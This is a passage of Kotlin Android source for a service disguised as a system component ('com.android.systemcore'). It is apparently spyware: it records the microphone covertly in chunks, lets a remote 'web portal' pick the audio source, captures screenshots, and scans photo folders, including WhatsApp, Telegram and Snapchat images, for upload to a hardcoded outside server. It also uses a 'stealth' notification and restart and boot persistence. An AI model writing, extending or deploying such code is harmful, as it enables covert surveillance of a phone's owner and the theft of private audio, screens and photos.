package com.android.systemcore

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.provider.MediaStore
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import io.socket.client.IO
import io.socket.client.Socket
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.*
import java.util.concurrent.atomic.AtomicBoolean

class RecordingService : Service() {

    private val tag = "SystemCore"
    private val channelId = "system_core_channel"
    private val notificationId = 1

    private var socket: Socket? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentRecordingFile: File? = null
    private var serverUrl = DEFAULT_SERVER_URL

    private var deviceId = ""
    private var deviceName = ""

    private val handler = Handler(Looper.getMainLooper())
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private var stopRecordingRunnable: Runnable? = null
    private var watchdogRunnable: Runnable? = null
    private val watchdogInterval = 30000L
    
    // ==================== CHUNKED RECORDING FOR LONG DURATIONS ====================
    // Records long sessions in 30-minute chunks to prevent file corruption
    // Each chunk is queued for upload immediately after completion
    
    private val maxChunkDurationSeconds = 30 * 60  // 30 minutes per chunk
    private var isChunkedRecording = false
    private var totalRequestedDuration = 0
    private var remainingDuration = 0
    private var currentChunkNumber = 0
    private var recordingSessionId = ""

    // ==================== AUDIO SOURCE MANAGEMENT ====================

    // All available audio sources to test
    private val ALL_AUDIO_SOURCES = listOf(
        MediaRecorder.AudioSource.CAMCORDER,
        MediaRecorder.AudioSource.VOICE_RECOGNITION,
        MediaRecorder.AudioSource.MIC,
        MediaRecorder.AudioSource.DEFAULT,
        MediaRecorder.AudioSource.VOICE_COMMUNICATION
    )

    // Audio source names for reporting
    private val AUDIO_SOURCE_NAMES = mapOf(
        MediaRecorder.AudioSource.CAMCORDER to "CAMCORDER",
        MediaRecorder.AudioSource.VOICE_RECOGNITION to "VOICE_RECOGNITION",
        MediaRecorder.AudioSource.MIC to "MIC",
        MediaRecorder.AudioSource.DEFAULT to "DEFAULT",
        MediaRecorder.AudioSource.VOICE_COMMUNICATION to "VOICE_COMMUNICATION"
    )

    // Reverse mapping
    private val AUDIO_SOURCE_VALUES = mapOf(
        "CAMCORDER" to MediaRecorder.AudioSource.CAMCORDER,
        "VOICE_RECOGNITION" to MediaRecorder.AudioSource.VOICE_RECOGNITION,
        "MIC" to MediaRecorder.AudioSource.MIC,
        "DEFAULT" to MediaRecorder.AudioSource.DEFAULT,
        "VOICE_COMMUNICATION" to MediaRecorder.AudioSource.VOICE_COMMUNICATION
    )

    // Current audio source settings
    private var autoDetectedSource: Int? = null
    private var userSelectedSource: Int? = null  // Set from web portal
    private var audioSourceTestResults = mutableMapOf<String, String>()
    private var hasTestedAudioSources = false

    /**
     * Get the audio source to use for recording
     * Priority: 1) User selected (from web portal), 2) Auto-detected, 3) Manufacturer default
     */
    private fun getPreferredAudioSource(): Int {
        // First priority: User selected from web portal
        userSelectedSource?.let {
            Log.d(tag, "Using user-selected audio source: ${AUDIO_SOURCE_NAMES[it]}")
            return it
        }

        // Second priority: Auto-detected working source
        autoDetectedSource?.let {
            Log.d(tag, "Using auto-detected audio source: ${AUDIO_SOURCE_NAMES[it]}")
            return it
        }

        // Third priority: Load from saved preferences
        val prefs = getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
        val savedSource = prefs.getInt("auto_detected_audio_source", -1)
        if (savedSource != -1) {
            autoDetectedSource = savedSource
            Log.d(tag, "Using saved audio source: ${AUDIO_SOURCE_NAMES[savedSource]}")
            return savedSource
        }

        // Fourth priority: Manufacturer-based default
        return getManufacturerDefaultSource()
    }

    /**
     * Get manufacturer-based default audio source
     */
    private fun getManufacturerDefaultSource(): Int {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return when {
            manufacturer.contains("samsung") -> MediaRecorder.AudioSource.CAMCORDER
            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> MediaRecorder.AudioSource.VOICE_RECOGNITION
            manufacturer.contains("huawei") || manufacturer.contains("honor") -> MediaRecorder.AudioSource.VOICE_RECOGNITION
            manufacturer.contains("oppo") || manufacturer.contains("realme") || manufacturer.contains("oneplus") -> MediaRecorder.AudioSource.DEFAULT
            manufacturer.contains("vivo") || manufacturer.contains("iqoo") -> MediaRecorder.AudioSource.VOICE_RECOGNITION
            Build.VERSION.SDK_INT <= Build.VERSION_CODES.S -> MediaRecorder.AudioSource.VOICE_RECOGNITION
            else -> MediaRecorder.AudioSource.MIC
        }
    }

    /**
     * Test all audio sources and find working ones
     * Called on first recording or when requested from web portal
     */
    private fun testAllAudioSources(callback: (Map<String, String>, Int?) -> Unit) {
        Thread {
            val results = mutableMapOf<String, String>()
            var bestWorkingSource: Int? = null

            Log.d(tag, "Starting audio source detection test...")

            for (source in ALL_AUDIO_SOURCES) {
                val sourceName = AUDIO_SOURCE_NAMES[source] ?: "UNKNOWN"

                try {
                    val testFile = File(cacheDir, "audio_test_${sourceName}.m4a")
                    val testRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        MediaRecorder(this)
                    } else {
                        @Suppress("DEPRECATION")
                        MediaRecorder()
                    }

                    testRecorder.apply {
                        setAudioSource(source)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setAudioChannels(1)
                        setAudioSamplingRate(16000)
                        setAudioEncodingBitRate(64000)
                        setOutputFile(testFile.absolutePath)
                    }

                    try {
                        testRecorder.prepare()
                        testRecorder.start()

                        // Record for 1 second
                        Thread.sleep(1000)

                        testRecorder.stop()
                        testRecorder.release()

                        // Check if file has content
                        if (testFile.exists() && testFile.length() > 1000) {
                            results[sourceName] = "working"
                            if (bestWorkingSource == null) {
                                bestWorkingSource = source
                            }
                            Log.d(tag, "✓ $sourceName: WORKING (${testFile.length()} bytes)")
                        } else {
                            results[sourceName] = "silent"
                            Log.d(tag, "✗ $sourceName: SILENT (${testFile.length()} bytes)")
                        }

                        // Clean up test file
                        testFile.delete()

                    } catch (e: Exception) {
                        testRecorder.release()
                        testFile.delete()
                        results[sourceName] = "error: ${e.message?.take(50)}"
                        Log.d(tag, "✗ $sourceName: ERROR - ${e.message}")
                    }

                } catch (e: Exception) {
                    results[sourceName] = "error: ${e.message?.take(50)}"
                    Log.d(tag, "✗ $sourceName: INIT ERROR - ${e.message}")
                }

                // Small delay between tests
                Thread.sleep(500)
            }

            // Save results
            audioSourceTestResults = results.toMutableMap()
            hasTestedAudioSources = true

            // Save best working source
            if (bestWorkingSource != null) {
                autoDetectedSource = bestWorkingSource
                getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE).edit()
                    .putInt("auto_detected_audio_source", bestWorkingSource)
                    .putLong("audio_source_test_time", System.currentTimeMillis())
                    .apply()
            }

            Log.d(tag, "Audio source test complete. Best: ${AUDIO_SOURCE_NAMES[bestWorkingSource]}")

            handler.post {
                callback(results, bestWorkingSource)
            }

        }.start()
    }

    /**
     * Set audio source from web portal
     */
    private fun setAudioSourceFromPortal(sourceName: String) {
        val source = AUDIO_SOURCE_VALUES[sourceName]
        if (source != null) {
            userSelectedSource = source
            getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE).edit()
                .putInt("user_selected_audio_source", source)
                .putString("user_selected_audio_source_name", sourceName)
                .apply()

            Log.d(tag, "Audio source set from portal: $sourceName")

            // Notify portal of change
            socket?.emit("audio_source_updated", JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("selectedSource", sourceName)
                put("autoDetectedSource", AUDIO_SOURCE_NAMES[autoDetectedSource] ?: "unknown")
            })
        } else {
            Log.e(tag, "Unknown audio source: $sourceName")
        }
    }

    /**
     * Clear user selection and use auto-detected
     */
    private fun resetToAutoDetectedSource() {
        userSelectedSource = null
        getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE).edit()
            .remove("user_selected_audio_source")
            .remove("user_selected_audio_source_name")
            .apply()

        Log.d(tag, "Reset to auto-detected source: ${AUDIO_SOURCE_NAMES[autoDetectedSource]}")

        socket?.emit("audio_source_updated", JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("selectedSource", "auto")
            put("autoDetectedSource", AUDIO_SOURCE_NAMES[autoDetectedSource] ?: "unknown")
        })
    }

    /**
     * Get current audio source configuration for reporting
     */
    private fun getAudioSourceConfig(): JSONObject {
        val prefs = getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)

        return JSONObject().apply {
            put("autoDetectedSource", AUDIO_SOURCE_NAMES[autoDetectedSource] ?: "not_tested")
            put("userSelectedSource", if (userSelectedSource != null) AUDIO_SOURCE_NAMES[userSelectedSource] else "auto")
            put("currentSource", AUDIO_SOURCE_NAMES[getPreferredAudioSource()] ?: "unknown")
            put("manufacturerDefault", AUDIO_SOURCE_NAMES[getManufacturerDefaultSource()] ?: "unknown")
            put("hasTestedSources", hasTestedAudioSources)
            put("lastTestTime", prefs.getLong("audio_source_test_time", 0))
            put("testResults", JSONObject(audioSourceTestResults.toMap()))
        }
    }

    /**
     * Load saved audio source preferences
     */
    private fun loadAudioSourcePreferences() {
        val prefs = getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)

        val savedAutoSource = prefs.getInt("auto_detected_audio_source", -1)
        if (savedAutoSource != -1) {
            autoDetectedSource = savedAutoSource
        }

        val savedUserSource = prefs.getInt("user_selected_audio_source", -1)
        if (savedUserSource != -1) {
            userSelectedSource = savedUserSource
        }

        Log.d(tag, "Loaded audio prefs - Auto: ${AUDIO_SOURCE_NAMES[autoDetectedSource]}, User: ${AUDIO_SOURCE_NAMES[userSelectedSource]}")
    }

    // Dual thread executors - one for small files, one for large files
    private val smallFileExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    private val largeFileExecutor: ExecutorService = Executors.newSingleThreadExecutor()

    // Thread-safe tracking
    private val filesBeingUploaded = ConcurrentHashMap.newKeySet<String>()
    private val failedFiles = ConcurrentHashMap<String, FailedFileInfo>()
    private val isProcessingSmallFiles = AtomicBoolean(false)
    private val isProcessingLargeFiles = AtomicBoolean(false)

    // Upload health monitoring
    private var consecutiveFailures = 0
    private var lastFailureTime = 0L
    private var isPaused = false
    private val pauseDurationMs = 2 * 60 * 1000L // 2 minutes pause after multiple failures

    // Size thresholds (in bytes)
    private val SMALL_FILE_THRESHOLD = 5 * 1024 * 1024L  // 5 MB
    private val LARGE_FILE_THRESHOLD = 10 * 1024 * 1024L // 10 MB for chunked upload
    private val MAX_QUEUE_SIZE = 100
    private val MAX_FILE_AGE_DAYS = 7

    // Timeout values for Pakistan VERY slow internet (50-100 kbps)
    // At 50 kbps: 1MB = 163 seconds, 5MB = 13.6 min, 10MB = 27 min, 20MB = 54 min
    // Adding 2x safety margin for connection instability
    private val SMALL_FILE_TIMEOUT_SECONDS = 300L       // 5 minutes for <5MB
    private val MEDIUM_FILE_TIMEOUT_SECONDS = 900L      // 15 minutes for 5-10MB
    private val LARGE_FILE_TIMEOUT_SECONDS = 1800L      // 30 minutes for 10-20MB
    private val VERY_LARGE_FILE_TIMEOUT_SECONDS = 5400L // 90 minutes for >20MB

    // Retry settings
    private val MAX_RETRY_ATTEMPTS = 3
    private val RETRY_DELAY_BASE_MS = 30000L // 30 seconds base delay
    private val MAX_CONSECUTIVE_FAILURES = 5  // Pause after this many failures

    // Data class for tracking failed files
    data class FailedFileInfo(
        val filename: String,
        val failCount: Int,
        val lastFailTime: Long,
        val fileSize: Long
    )

    // ==================== GALLERY MONITORING SYSTEM ====================

    // Data class for gallery image metadata
    data class GalleryImageInfo(
        val id: Long,
        val path: String,
        val name: String,
        val size: Long,
        val dateAdded: Long,      // Unix timestamp when added
        val dateModified: Long,   // Unix timestamp when modified
        val dateTaken: Long,      // Unix timestamp from EXIF (when photo was taken)
        val width: Int,
        val height: Int,
        val mimeType: String,
        val folderName: String,   // Camera, Downloads, Screenshots, WhatsApp, etc.
        val folderPath: String,   // Also used to store requestId temporarily
        var retryCount: Int = 0   // Track retry attempts
    )

    // Gallery upload queue (separate from recording queue)
    private val galleryUploadQueue = java.util.concurrent.ConcurrentLinkedQueue<GalleryImageInfo>()
    private val galleryFailedQueue = java.util.concurrent.ConcurrentLinkedQueue<GalleryImageInfo>() // For retry
    private val isProcessingGalleryQueue = java.util.concurrent.atomic.AtomicBoolean(false)
    private val galleryUploadExecutor: java.util.concurrent.ExecutorService = java.util.concurrent.Executors.newSingleThreadExecutor()
    private val GALLERY_MAX_RETRIES = 3

    // Gallery scan in progress flag
    private var isGalleryScanInProgress = false

    // Known image folders for different manufacturers
    private val KNOWN_IMAGE_FOLDERS = listOf(
        // Standard Android
        "DCIM/Camera",
        "DCIM",
        "Pictures",
        "Pictures/Screenshots",
        "Download",
        "Downloads",
        // WhatsApp
        "WhatsApp/Media/WhatsApp Images",
        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
        // Telegram
        "Telegram/Telegram Images",
        "Pictures/Telegram",
        // Instagram
        "Pictures/Instagram",
        // Facebook
        "Pictures/Facebook",
        "Facebook",
        // Snapchat
        "Snapchat",
        "Pictures/Snapchat",
        // TikTok
        "Pictures/TikTok",
        // Samsung
        "DCIM/Screenshots",
        // Xiaomi/MIUI
        "MIUI/Gallery/cloud/.cache",
        "DCIM/Screenshots",
        // Others
        "Pictures/Saved Pictures",
        "Pictures/Twitter",
        "Pictures/Reddit"
    )

    /**
     * Calculate timeout based on file size
     * For Pakistan's slow internet (50-100 kbps)
     */
    private fun getTimeoutForFile(file: File): Long {
        val sizeBytes = file.length()
        return when {
            sizeBytes < SMALL_FILE_THRESHOLD -> SMALL_FILE_TIMEOUT_SECONDS
            sizeBytes < LARGE_FILE_THRESHOLD -> MEDIUM_FILE_TIMEOUT_SECONDS
            sizeBytes < 20 * 1024 * 1024L -> LARGE_FILE_TIMEOUT_SECONDS
            else -> VERY_LARGE_FILE_TIMEOUT_SECONDS
        }
    }

    @Volatile
    private var isInternetAvailable = true
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var connectivityManager: ConnectivityManager? = null

    // WiFi Lock - keeps WiFi radio active when screen is off
    private var wifiLock: android.net.wifi.WifiManager.WifiLock? = null

    // Connection health monitoring
    private var lastPongReceived = 0L
    private var lastPingSent = 0L
    private var connectionHealthy = true
    private val CONNECTION_HEALTH_CHECK_INTERVAL = 60000L // Check every 60 seconds
    private val CONNECTION_UNHEALTHY_THRESHOLD = 120000L  // 2 minutes without pong = unhealthy

    private val uploadDelayBetweenFilesMs = 3000L // 3 seconds between uploads

    private var startedFromBoot = false
    private var currentFgsType = 0

    // Screenshot capture
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isCapturingScreenshot = false
    private var screenshotCallback: ((Boolean, String?) -> Unit)? = null

    // Screen info
    private var screenWidth = 0
    private var screenHeight = 0
    private var screenDensity = 0

    companion object {
        @Volatile
        private var isRunning = false

        // ============ DEFAULT SERVER URL ============
        // This is the hardcoded default URL used on first installation
        // Can be changed later via the app UI
        const val DEFAULT_SERVER_URL = "http://212.47.78.65"

        // MediaProjection intent data (saved from permission activity)
        @Volatile
        var mediaProjectionResultCode: Int = Activity.RESULT_CANCELED
        @Volatile
        var mediaProjectionData: Intent? = null

        fun isServiceRunning(): Boolean = isRunning

        fun startService(context: Context, fromBoot: Boolean = false) {
            try {
                val intent = Intent(context, RecordingService::class.java).apply {
                    putExtra("FROM_BOOT", fromBoot)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e("SystemCore", "Failed to start service: ${e.message}")
            }
        }

        fun setMediaProjectionPermission(resultCode: Int, data: Intent?) {
            mediaProjectionResultCode = resultCode
            mediaProjectionData = data
        }
    }

    override fun onCreate() {
        super.onCreate()

        try {
            Log.d(tag, "=== onCreate START === Android ${Build.VERSION.SDK_INT} (${Build.VERSION.RELEASE})")

            if (isInCrashLoop()) {
                Log.e(tag, "Service in crash loop - scheduling delayed restart")
                scheduleDelayedRestart(60000)
                stopSelf()
                return
            }

            recordServiceStart()
            isRunning = true

            // Get screen metrics
            initScreenMetrics()

            createNotificationChannel()
            Log.d(tag, "Step 1: Notification channel created")

            startForegroundSafe(false)
            Log.d(tag, "Step 2: Foreground started")

            loadDeviceInfo()
            Log.d(tag, "Step 3: Device info loaded - $deviceName ($deviceId)")

            try {
                setupNetworkCallback()
                Log.d(tag, "Step 4: Network callback setup")
            } catch (e: Exception) {
                Log.w(tag, "Network callback failed: ${e.message}")
            }

            // Acquire WiFi lock to keep WiFi active when screen is off
            try {
                acquireWifiLock()
                Log.d(tag, "Step 4b: WiFi lock acquired")
            } catch (e: Exception) {
                Log.w(tag, "WiFi lock failed: ${e.message}")
            }

            try {
                startWatchdog()
                Log.d(tag, "Step 5: Watchdog started")
            } catch (e: Exception) {
                Log.w(tag, "Watchdog failed: ${e.message}")
            }

            // Start connection health monitor
            try {
                startConnectionHealthMonitor()
                Log.d(tag, "Step 5b: Connection health monitor started")
            } catch (e: Exception) {
                Log.w(tag, "Connection health monitor failed: ${e.message}")
            }

            try {
                scheduleAllRestartMechanisms()
                Log.d(tag, "Step 6: Restart mechanisms scheduled")
            } catch (e: Exception) {
                Log.w(tag, "Restart mechanisms failed: ${e.message}")
            }

            clearCrashCounterDelayed()

            Log.d(tag, "=== Service created successfully ===")

        } catch (e: Exception) {
            Log.e(tag, "!!! FATAL ERROR in onCreate !!!", e)
            recordServiceCrash()
            handleFatalError(e)
        }
    }

    private fun initScreenMetrics() {
        try {
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val metrics = windowManager.currentWindowMetrics
                screenWidth = metrics.bounds.width()
                screenHeight = metrics.bounds.height()
            } else {
                val displayMetrics = DisplayMetrics()
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay.getMetrics(displayMetrics)
                screenWidth = displayMetrics.widthPixels
                screenHeight = displayMetrics.heightPixels
            }
            screenDensity = resources.displayMetrics.densityDpi
            Log.d(tag, "Screen: ${screenWidth}x${screenHeight} @ $screenDensity dpi")
        } catch (e: Exception) {
            Log.e(tag, "Failed to get screen metrics: ${e.message}")
            screenWidth = 1080
            screenHeight = 1920
            screenDensity = 320
        }
    }

    private fun areNotificationsEnabled(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val manager = getSystemService(NotificationManager::class.java)
                if (!manager.areNotificationsEnabled()) return false
                val channel = manager.getNotificationChannel(channelId)
                channel?.importance != NotificationManager.IMPORTANCE_NONE
            } else {
                NotificationManagerCompat.from(this).areNotificationsEnabled()
            }
        } catch (e: Exception) {
            true
        }
    }

    private fun canUseMicrophoneFgsType(): Boolean {
        if (!hasMicrophonePermission()) return false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            if (!areNotificationsEnabled()) return false
        }
        if (startedFromBoot) return false
        return true
    }

    private fun startForegroundSafe(isRecordingMode: Boolean) {
        val notification = createStealthNotification(if (isRecordingMode) "Processing" else "Running")

        try {
            when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                    val serviceType = if (isRecordingMode && canUseMicrophoneFgsType()) {
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
                                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    } else {
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                    }

                    Log.d(tag, "Starting foreground: type=$serviceType, recording=$isRecordingMode")
                    currentFgsType = serviceType

                    ServiceCompat.startForeground(this, notificationId, notification, serviceType)
                }

                Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                    val serviceType = if (isRecordingMode && hasMicrophonePermission()) {
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    } else {
                        0
                    }
                    currentFgsType = serviceType

                    if (serviceType != 0) {
                        startForeground(notificationId, notification, serviceType)
                    } else {
                        startForeground(notificationId, notification)
                    }
                }

                else -> {
                    startForeground(notificationId, notification)
                }
            }
        } catch (e: Exception) {
            Log.e(tag, "Error starting foreground: ${e.message}")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    ServiceCompat.startForeground(
                        this, notificationId, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                    )
                } else {
                    startForeground(notificationId, notification)
                }
            } catch (e2: Exception) {
                Log.e(tag, "All foreground attempts failed!", e2)
                throw e2
            }
        }
    }

    private fun hasMicrophonePermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this, Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun handleFatalError(e: Exception) {
        try {
            createNotificationChannel()
            val errorNotification = NotificationCompat.Builder(this, channelId)
                .setContentTitle("Service Error")
                .setContentText("Error: ${e.message?.take(50)}")
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()

            try {
                startForeground(notificationId, errorNotification)
            } catch (e3: Exception) {
                getSystemService(NotificationManager::class.java).notify(9999, errorNotification)
            }
        } catch (e2: Exception) {
            Log.e(tag, "Failed to show error notification", e2)
        }

        scheduleDelayedRestart(30000)
        stopSelf()
    }

    private fun scheduleDelayedRestart(delayMs: Long) {
        try {
            RestartAlarmReceiver.scheduleDelayedAlarm(applicationContext, delayMs)
        } catch (e: Exception) {
            Log.e(tag, "Failed to schedule delayed restart", e)
        }
    }

    // ==================== Android 15 Timeout Handlers ====================

    override fun onTimeout(startId: Int) {
        super.onTimeout(startId)
        Log.w(tag, "onTimeout(startId=$startId)")
        handleServiceTimeout()
    }

    override fun onTimeout(startId: Int, fgsType: Int) {
        super.onTimeout(startId, fgsType)
        Log.w(tag, "onTimeout(startId=$startId, fgsType=$fgsType)")
        handleServiceTimeout()
    }

    private fun handleServiceTimeout() {
        try {
            if (isRecording) stopRecording()
            scheduleDelayedRestart(5000)
            stopSelf()
        } catch (e: Exception) {
            stopSelf()
        }
    }

    // ==================== Crash Detection ====================

    private fun isInCrashLoop(): Boolean {
        val prefs = getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
        val crashCount = prefs.getInt("crash_count", 0)
        val lastCrashTime = prefs.getLong("last_crash_time", 0)
        val currentTime = System.currentTimeMillis()

        if (currentTime - lastCrashTime > 5 * 60 * 1000) {
            prefs.edit().putInt("crash_count", 0).putLong("last_crash_time", 0).apply()
            return false
        }

        return crashCount >= 5
    }

    private fun recordServiceStart() {
        getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
            .edit().putLong("last_start_time", System.currentTimeMillis()).apply()
    }

    private fun recordServiceCrash() {
        val prefs = getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
        val crashCount = prefs.getInt("crash_count", 0)
        prefs.edit()
            .putInt("crash_count", crashCount + 1)
            .putLong("last_crash_time", System.currentTimeMillis())
            .apply()
    }

    private fun clearCrashCounterDelayed() {
        handler.postDelayed({
            getSharedPreferences("SystemCorePrefs", Context.MODE_PRIVATE)
                .edit().putInt("crash_count", 0).putLong("last_crash_time", 0).apply()
            startedFromBoot = false
        }, 30000)
    }

    // ==================== Network Monitoring ====================

    /**
     * Acquire WiFi lock to keep WiFi radio active when screen is off
     * This prevents disconnections when device goes to sleep
     */
    @Suppress("DEPRECATION")
    private fun acquireWifiLock() {
        try {
            if (wifiLock == null) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager

                // Use WIFI_MODE_FULL_LOW_LATENCY on Android 10+ (API 29+)
                // Fall back to WIFI_MODE_FULL_HIGH_PERF on older versions
                val lockMode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    android.net.wifi.WifiManager.WIFI_MODE_FULL_LOW_LATENCY
                } else {
                    android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF
                }

                wifiLock = wifiManager.createWifiLock(lockMode, "SystemCore:WifiLock")
                wifiLock?.setReferenceCounted(false)
            }

            if (wifiLock?.isHeld == false) {
                wifiLock?.acquire()
                Log.d(tag, "WiFi lock acquired - WiFi will stay active when screen off")
            }
        } catch (e: Exception) {
            Log.e(tag, "Failed to acquire WiFi lock: ${e.message}")
        }
    }

    /**
     * Release WiFi lock when service is destroyed
     */
    private fun releaseWifiLock() {
        try {
            if (wifiLock?.isHeld == true) {
                wifiLock?.release()
                Log.d(tag, "WiFi lock released")
            }
        } catch (e: Exception) {
            Log.e(tag, "Failed to release WiFi lock: ${e.message}")
        }
    }

    /**
     * Connection health monitor - checks if socket is truly responsive
     * Handles cases where socket.connected() returns true but connection is actually dead
     */
    private var connectionHealthRunnable: Runnable? = null

    private fun startConnectionHealthMonitor() {
        connectionHealthRunnable = object : Runnable {
            override fun run() {
                try {
                    checkConnectionHealth()
                    handler.postDelayed(this, CONNECTION_HEALTH_CHECK_INTERVAL)
                } catch (e: Exception) {
                    Log.e(tag, "Connection health check error: ${e.message}")
                    handler.postDelayed(this, CONNECTION_HEALTH_CHECK_INTERVAL)
                }
            }
        }
        handler.postDelayed(connectionHealthRunnable!!, CONNECTION_HEALTH_CHECK_INTERVAL)
    }

    /**
     * Check if connection is truly healthy by monitoring ping/pong
     */
    private fun checkConnectionHealth() {
        val now = System.currentTimeMillis()

        // If we haven't received a pong in a while, connection might be dead
        if (lastPongReceived > 0 && (now - lastPongReceived) > CONNECTION_UNHEALTHY_THRESHOLD) {
            Log.w(tag, "Connection unhealthy - no pong received in ${(now - lastPongReceived) / 1000}s")
            connectionHealthy = false

            // Force reconnect
            handler.post {
                updateNotification("Reconnecting...")
                socket?.disconnect()
                connectToServer()
            }
        } else {
            connectionHealthy = true
        }

        // Send our own ping to server for health check
        if (socket?.connected() == true) {
            lastPingSent = now
            socket?.emit("health_check", org.json.JSONObject().apply {
                put("deviceId", deviceId)
                put("timestamp", now)
            })
        }
    }

    private fun setupNetworkCallback() {
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        isInternetAvailable = checkInternetConnectivity()

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                val wasOffline = !isInternetAvailable
                isInternetAvailable = true
                if (wasOffline) {
                    handler.post {
                        updateNotification("Syncing")
                        if (socket == null || socket?.connected() != true) connectToServer()
                        processPendingUploads()
                        resumeGalleryUploadsIfNeeded() // Resume gallery uploads too
                    }
                }
            }

            override fun onLost(network: Network) {
                handler.postDelayed({
                    isInternetAvailable = checkInternetConnectivity()
                    if (!isInternetAvailable) updateNotification("Waiting")
                }, 1000)
            }

            override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
                val hasInternet = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                if (hasInternet && !isInternetAvailable) {
                    isInternetAvailable = true
                    handler.post {
                        processPendingUploads()
                        resumeGalleryUploadsIfNeeded() // Resume gallery uploads too
                    }
                }
            }
        }

        connectivityManager?.registerNetworkCallback(
            NetworkRequest.Builder().addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build(),
            networkCallback!!
        )
    }

    private fun checkInternetConnectivity(): Boolean {
        return try {
            val cm = connectivityManager ?: return false
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } catch (e: Exception) {
            false
        }
    }

    // ==================== GALLERY MONITORING SYSTEM ====================

    /**
     * Check if we have permission to read gallery images
     */
    private fun hasGalleryPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ requires READ_MEDIA_IMAGES
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
        } else {
            // Android 12 and below uses READ_EXTERNAL_STORAGE
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Scan gallery and get images based on flexible criteria
     *
     * @param count Maximum number of images to return (0 = unlimited)
